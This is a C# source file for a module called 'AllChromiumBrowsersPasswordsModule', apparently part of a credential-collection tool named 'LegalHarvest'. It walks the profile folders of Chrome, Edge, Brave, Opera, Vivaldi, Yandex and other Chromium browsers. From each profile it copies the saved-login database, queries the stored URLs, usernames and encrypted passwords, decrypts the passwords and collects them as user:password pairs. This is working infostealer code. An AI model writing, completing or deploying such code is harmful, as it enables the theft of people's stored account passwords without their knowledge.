using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace LegalHarvest.Modules
{
    public class AllChromiumBrowsersPasswordsModule : ICollectorModule
    {
        public string ModuleName => "AllChromiumPasswords";

        private readonly List<(string Name, string RelativePath)> browsers = new List<(string, string)>
        {
            ("Chrome", @"Google\Chrome\User Data"),
            ("Edge", @"Microsoft\Edge\User Data"),
            ("Brave", @"BraveSoftware\Brave-Browser\User Data"),
            ("Opera", @"Opera Software\Opera Stable"),
            ("Opera GX", @"Opera Software\Opera GX Stable"),
            ("Vivaldi", @"Vivaldi\User Data"),
            ("Yandex", @"Yandex\YandexBrowser\User Data"),
            ("Chromium", @"Chromium\User Data")
        };

        public bool CanExecute() => true;

        public List<CollectedItem> Collect()
        {
            var items = new List<CollectedItem>();
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            foreach (var browser in browsers)
            {
                string basePath = Path.Combine(localAppData, browser.RelativePath);
                if (!Directory.Exists(basePath)) continue;

                foreach (string profileDir in Directory.GetDirectories(basePath, "*", SearchOption.TopDirectoryOnly))
                {
                    string loginDb = Path.Combine(profileDir, "Login Data");
                    if (!File.Exists(loginDb)) continue;

                    string tempDb = Path.GetTempFileName();
                    File.Copy(loginDb, tempDb, true);
                    try
                    {
                        using (var conn = new SQLiteConnection($"Data Source={tempDb};Version=3;"))
                        {
                            conn.Open();
                            string query = "SELECT origin_url, username_value, password_value FROM logins";
                            using (var cmd = new SQLiteCommand(query, conn))
                            using (var reader = cmd.ExecuteReader())
                            {
                                while (reader.Read())
                                {
                                    string url = reader["origin_url"].ToString();
                                    string user = reader["username_value"].ToString();
                                    byte[] encryptedPassword = (byte[])reader["password_value"];
                                    string password = "";
                                    if (encryptedPassword != null && encryptedPassword.Length > 0)
                                    {
                                        try
                                        {
                                            byte[] decrypted = ProtectedData.Unprotect(encryptedPassword, null, DataProtectionScope.CurrentUser);
                                            password = Encoding.UTF8.GetString(decrypted);
                                        }
                                        catch { password = "[DECRYPT_FAILED]"; }
                                    }
                                    items.Add(new CollectedItem { Category = $"{browser.Name}Passwords", Name = url, Value = $"{user}:{password}", Timestamp = DateTime.Now });
                                }
                            }
                        }
                    }
                    finally { if (File.Exists(tempDb)) File.Delete(tempDb); }
                }
            }
            return items;
        }
    }
}
